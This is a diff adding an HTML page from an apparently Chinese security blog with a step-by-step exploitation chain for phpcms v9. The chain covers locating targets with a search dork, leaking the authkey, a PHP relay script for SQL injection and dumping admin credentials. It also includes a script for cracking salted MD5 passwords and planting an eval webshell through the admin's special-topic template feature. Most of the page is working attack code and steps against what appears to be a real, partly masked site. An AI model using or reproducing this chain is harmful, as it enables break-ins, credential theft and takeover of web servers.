@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<head>
+
+	<title>poions blog</title>
+	<meta name="keywords" content="" />
+	<meta name="description" content="" />
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<link href="/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+	<link href="/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<link href="/css/templatemo_style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+	<div class="templatemo-logo visible-xs-block">
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 black-bg logo-left-container">
+			<h1 class="logo-left">Black</h1>
+		</div>
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 white-bg logo-right-container">
+			<h1 class="logo-right">White</h1>
+		</div>
+	</div>
+	<div class="templatemo-container">
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 black-bg left-container">
+			<h1 class="logo-left hidden-xs margin-bottom-60">Black</h1>
+			<div class="tm-left-inner-container">
+				<ul class="nav nav-stacked templatemo-nav">
+				  <li><a href="\index.html"><i class="fa fa-home fa-medium"></i>首页</a></li>
+				  <li><a href="\web.html" class="active"><i class="fa fa-shopping-cart fa-medium"></i>Web安全</a></li>
+				  <li><a href="\ctf.html"><i class="fa fa-send-o fa-medium"></i>CTF</a></li>
+				  <li><a href="\zawen.html"><i class="fa fa-comments-o fa-medium"></i>杂文</a></li>
+				  <li><a href="\contact.html"><i class="fa fa-envelope-o fa-medium"></i>联系方式</a></li>
+				</ul>
+			</div>
+		</div>
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 white-bg right-container">
+			<h1 class="logo-right hidden-xs margin-bottom-60">White</h1>
+			<div class="tm-right-inner-container">
+				<h1 class="templatemo-header"><strong>phpcms v9组合漏洞</strong></h1>
+				<article class="templatemo-item">
+				 </br>
+						<p>
+						phpcms v9利用多个漏洞进行getshell，通过autkey的泄漏进行注入再到后台getshell
+						</p>
+								<div> 在google上利用搜索引擎对该系统进行查找：intitle:phpcms v9</div>
+				</br>
+				<h1 class="templatemo-header"><strong>0x01 案例</strong></h1>
+				<span>
+				<p>漏洞地址：http://www.****.com/yzgjb/index.php?m=admin </p>
+			</br>
+				authkey泄漏点:用户中心头像编辑处,右键查看该页面的源码
+			<img src="images\20170926092127.jpg" alt="frist" class="img-thumbnail">
+			var flashvars ={}
+		</br><p>里面加密内容，加密方法为base64加密。复制编码解密得</p>
+	</br>
+		<img src="images\20170926093113.jpg" alt="frist" class="img-thumbnail">
+		<p>解密出来后需要把uploadavatar替换成getapplist</p>
+	   <pre>http://www.***.com/yzgjb/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=f60bCARUBFMJVlQDAlVUBwQNUwYBAlsAUA0EClRBCwZfBgAeRBdrAkwSDGxZVB8NZk0mflZzUDYIYFBRKVAaAwVFDlRCJgVaCDVRfEBWNgc0</pre>
+		 <p>进入访问url，找到authkey</p>
+		 <pre>QuBO4F2W9YahKdxagq7lvB191S5OrgP7</pre>
+
+		 <h1 class="templatemo-header"><strong>0x02 生成中转注入脚本</strong></h1>
+		 <p>网上针对authkey泄漏进行中转注入也有脚本，这里利用到获取到的authkey进行 md5\base64的加解密进行中转注入</p>
+<textarea>
+	<?php
+	set_time_limit(0);
+	$wang_url = 'http://www.***.com/yzgjb/phpsso_server/index.php';       //请修改这里为phpcmsv9网站地址
+	$auth_key = 'QuBO4F2W9YahKdxagq7lvB191S5OrgP7'; 												//这里为phpcmsv9 authkey
+	$str = "uid=1" . stripslashes($_GET['id']);
+	$encode = sys_auth($str, 'ENCODE', $auth_key);
+	$content = file_get_contents($wang_url . "/phpsso_server/?m=phpsso&c=index&a=getuserinfo&appid=1&data=" . $encode);
+	echo $content;
+	function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0)
+	{
+	    $key_length = 4;
+	    $key = md5($key);
+	    $fixedkey = hash('md5', $key);
+	    $egiskeys = md5(substr($fixedkey, 16, 16));
+	    $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(hash('md5', microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
+	    $keys = hash('md5', substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
+	    $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));
+	    $i = 0;
+	    $result = '';
+	    $string_length = strlen($string);
+	    for ($i = 0; $i < $string_length; $i++) {
+	        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
+	    }
+	    if ($operation == 'ENCODE') {
+	        return $runtokey . str_replace('=', '', base64_encode($result));
+	    } else {
+	        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $egiskeys), 0, 16)) {
+	            return substr($result, 26);
+	        } else {
+	            return '';
+	        }
+	    }
+	}
+	?>
+</textarea>
+</br>
+		<h1 class="templatemo-header"><strong>0x03 利用泄漏的authkey进行中转注入</strong></h1>
+		<p>首先本地搭建web服务用于进行中转</p>
+		<p>一：把poc放到根目录下</p>
+		<p1>二：进入到本地web服务:http://127.0.0.1/poc.php?id=1<p1>
+		<p>三:这里有多种方法，一、手注(针对性强速度稍慢,准确性高）；二、使用胡萝卜注入工具（速度快）；三、sqlmap跑（速度慢，准确性稍低）</p>
+		<img src="images\20170926095347.jpg" alt="frist" class="img-thumbnail">
+		<p>成功注入出数据</p>
+		<p>利用工具直接找出后台管理员帐号密码</p>
+		<img src="images\20170926100129.jpg" alt="frist" class="img-thumbnail">
+		<p>相比之下sqlmap出来的速度相对较慢</p>
+		<img src="images\20170926100249.jpg" alt="frist" class="img-thumbnail">
+		</br>
+		<hr/>
+
+		<h1 class="templatemo-header"><strong>0x04 破解加盐密钥</strong></h1>
+		<p>往常许多新手在接触某个cms不久，意外之下注入出cms的后台账号密码，直接扔md5解密往往不能解出</p>
+		<p>那么这种情况下很有可能密钥已经被加盐,无法解出中断了后续的渗透</p>
+		<img src="images\20170926101004.jpg" alt="frist" class="img-thumbnail">
+		<p>像phpcms这种情况下，需要解出明文需要key来进行解密</p>
+		<p>通常情况下phpcms密码加密方式是通过三层加密的方法来进行加密</p>
+		<p>原理：在正常md5加密情况下，再加入一个salt(盐)来增值密码达到三层加密的效果</p>
+		<hr/>
+		<strong><p>python 实现方式</p></strong>
+		<pre>
+import hashlib
+a = hashlib.md5()
+a.update('123456')
+a1 = a.hexdigest()
+str(a1)
+b = hashlib.md5()
+b.update(a1+'vCmkn3')
+b1= b.hexdigest()
+print b1
+		</pre>
+		<img src="images\20170926102659.jpg" alt="frist" class="img-thumbnail">
+
+		<hr/>
+		<strong><p>php 实现方式</p></strong>
+		<pre>
+$a = md5("123456") ;
+echo $a; //$a结果为e10adc3949ba59abbe56e057f20f883eecho "
+$e = md5("e10adc3949ba59abbe56e057f20f883evCmkn3"); //md5(password)+encrypt
+echo $e; //$e的输出结果57cd0258e743463476e8d0028311ed44
+//所以123456经过phpcms v9加密规则后的结果就是57cd0258e743463476e8d0028311ed44
+?>
+		</pre>
+		<img src="images\20170926102559.jpg" alt="frist" class="img-thumbnail">
+	<hr/>
+		<strong><p>批量破解加盐md5 POC:</p></strong>
+		<pre>
+import hashlib
+import sys
+
+def md5a(encypt):
+	md5s = open('tmp.txt','r')
+	for s in md5s:
+		s = s.strip('\n')
+		a = hashlib.md5()
+		a.update(s)
+		a1 = a.hexdigest()
+		str(a1)
+		b = hashlib.md5()
+		b.update(a1+encypt)
+		b1= b.hexdigest()
+		md5q = b1+""+str(s),
+		print md5q
+		if "aaaaaaaaaaa" in md5q:	#这里aaaaaaaa设置成需要破解的md5
+			print md5q
+
+if __name__=='__main__':
+	if len(sys.argv) == 2:
+		md5a(sys.argv[1])
+	else:
+		sys.exit(0)
+	</pre>
+	<img src="images\20170926110920.jpg" alt="frist" class="img-thumbnail">
+
+	<p>通过撞库的方式,对明文进行三层加密后来匹配密文</p>
+	<hr/>
+		<h1 class="templatemo-header"><strong>0x05 phpcms v9后台getshell</strong></h1>
+		<p>进入后台</p>
+		<img src="images\20170926104637.jpg" alt="frist" class="img-thumbnail">
+		<pre>
+进入到选项-------->内容处，选择------>专题
+添加一个专题
+专题名称：test
+专题横幅：/1.jpg
+专题缩略图：/1.jpg
+专题导读：<?php eval($_POST[cmd007])?>
+生成静态：是
+专题生成目录：test000
+专题子分类：test test
+其他默认 -> 提交
+		</pre>
+		<img src="images\20170926105203.jpg" alt="frist" class="img-thumbnail">
+		<pre>
+再次添加专题
+		专题名称：test1
+		专题横幅：/1.jpg
+		专题缩略图：/1.jpg
+		专题导读：
+		生成静态：是
+		专题生成目录：test111
+		专题子分类：test test
+		扩展设置
+		专题模板：value设置为 ../../../../html/special/test000/index
+		其他默认 -> 提交
+		</pre>
+		<img src="images\20170926105340.jpg" alt="frist" class="img-thumbnail">
+		<p>配置完成好。</p>
+		<p>插入的一句话木马会在服务器根目录下生成php木马文件</p>
+		<img src="images\20170926105541.jpg" alt="frist" class="img-thumbnail">
+		<p>连接一句话</p>
+		<img src="images\20170926105644.jpg" alt="frist" class="img-thumbnail">
+		<p>成功getshell。</p>
+</span>
+						<br>
+						</br>
+
+<hr/>
+		<!-- 文章修改 -->
+		<li><a href="\phpcms_v9_GBK.zip"><i class="fa fa-envelope-o fa-medium"></i>phpcms v9源码下载</a></li>
+
+		<!--			<img src="images\chwww.jpg" alt="frist" class="img-thumbnail">  -->
+			</br>
+			</br>
+						by<span class="blue">：2017年7月26号</span><span class="green">下午2点钟</span>.</p>
+				<br/>
+
+
+
+		<!-- 文章修改 -->
+
+
+
+				</footer>
+			</div>
+		</div> <!-- right section -->
+	</div>
+</body>
+</html>
